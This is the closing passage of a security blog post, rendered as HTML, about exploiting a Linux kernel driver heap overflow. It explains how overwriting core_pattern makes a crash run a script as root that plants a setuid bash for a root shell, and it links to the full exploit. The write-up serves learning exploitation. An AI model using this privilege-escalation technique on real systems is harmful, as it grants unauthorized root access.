+</span></span></code></pre></div><p>When a process receives a segmentation fault, instead of generating a core file, it will execute the contents of the <code>/tmp/exp</code> file as <code>root</code>. This will create a copy of <code>/tmp/bash</code> in the temp folder with the <code>suid</code> bit set. When this executable is executed <code>/tmp/bash -p</code> a shell will be returned with escalated privz to root.</p>
+<p>When the final exploit is executed the following is the expected output. There is a <code>verify_exploit</code> function the reads the content of <code>/proc/sys/kernel/core_pattern</code> to check if the contents were modified as required. I tried to create a child process that crashes with a segmentation fault to dump a core file but for some reason <code>/tmp/exp</code> could not be executed.</p>
+
+  
+
+
+
+<div
+  
+    class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900"
+  >
+
+  <span
+    
+      class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center"
+    >
+
+    
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z"/></svg>
+
+  </span>
+
+
+  </span>
+
+  <span
+    
+      class="dark:text-neutral-300"
+    >When generating a core file, make sure that <code>ulimit -c unlimited</code> is set.</span>
+</div>
+
+<p>The following is the result of running the file exploit.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/pmVgqjm.png" alt="file_exploit" />
+    
+  </figure>
+
+</p>
+<p>The final exploit and all the configuration files used for building the kernel are provided <a href="https://github.com/mutur4/Blunder-Kernel-Driver"   target="_blank">
+    here</a></p>
+<div id="conclusion" class="anchor"></div>
+<h2 class="relative group">Conclusion 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<p>This article was about exploiting a heap overflow vulnerability to bypasss <code>FG-KASLR</code> and using an Arbitrary Address Write to overwrite <code>core_pattern</code> for LPE with a less-hardened old kernel used for exploitation.</p>
+<p>The next article will cover the exploitation of these vulnerabilities in a more hardened kernel using the <code>cross-cache</code> attack. This is because on modern Kernels most elastic objects are allocated in dedicated caches this is <code>kmalloc-cg-1k</code> instead of <code>kmalloc-1k</code> making traditional heap-overflow exploitation techniques a bit difficult.</p>
+<blockquote>
+<p><strong>NOTE</strong>: The above &lsquo;dedicated cache&rsquo; was actually a feature rather than a mitigation</p>
+</blockquote>
+<p>Until next time adios! <code>_exit(0)</code></p>
+<div id="references" class="anchor"></div>
+<h2 class="relative group">References 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#references" aria-label="Anchor">#</a></span>        
+    
+</h2>
+<ul>
+<li>[1] <a href="https://blog.wohin.me/posts/paper-eloise/"   target="_blank">
+    https://blog.wohin.me/posts/paper-eloise/</a></li>
+<li>[2] <a href="https://sam4k.com/linternals-memory-allocators-0x02/"   target="_blank">
+    https://sam4k.com/linternals-memory-allocators-0x02/</a></li>
+</ul>
+
+        </br></br>
+        
+
+      </div>
+      <script>
+        var oid = "views_posts\/linux-kernel-heap-overflow\/index.md"
+        var oid_likes = "likes_posts\/linux-kernel-heap-overflow\/index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.0e49973b4ad0a382c7c6012d8bff8226316642daabc4f8a20477bd08674f3da6e2fa993bc20ad4f51e7c5bb68e6f913a207a7c4fe37ea0e7b806894afce0a64e.js" integrity="sha512-DkmXO0rQo4LHxgEti/&#43;CJjFmQtqrxPiiBHe9CGdPPabi&#43;pk7wgrU9R58W7aOb5E6IHp8T&#43;N&#43;oOe4BolK/OCmTg=="></script>
+  </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    
+  
+    
+    
+    
+      
+      
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+        </span>
+        <span>
+          
+            <a class="flex text-right group ml-3" href="/posts/remote-process-injection/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Linux Remote Process Injection - (Injecting into a firefox process)</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-10-04 13:50:30 -0400 EDT">4 October 2023</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div class="pointer-events-none absolute top-[100vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2" href="/tags/"
+            title="Tags">Tags</a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2024
+      BinaryChunk
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.611c2f100351230a9f8fc00f14b270e9496cc3730da5a6d76742ce62982fe905bce336819ddb93eb75a002b363b7847f3a8d4d3a6feaf79861feb2c889ffae87.js" integrity="sha512-YRwvEANRIwqfj8APFLJw6Ulsw3MNpabXZ0LOYpgv6QW84zaBnduT63WgArNjt4R/Oo1NOm/q95hh/rLIif&#43;uhw=="></script>
+  
+  
+</footer><div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://mutur4.github.io/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
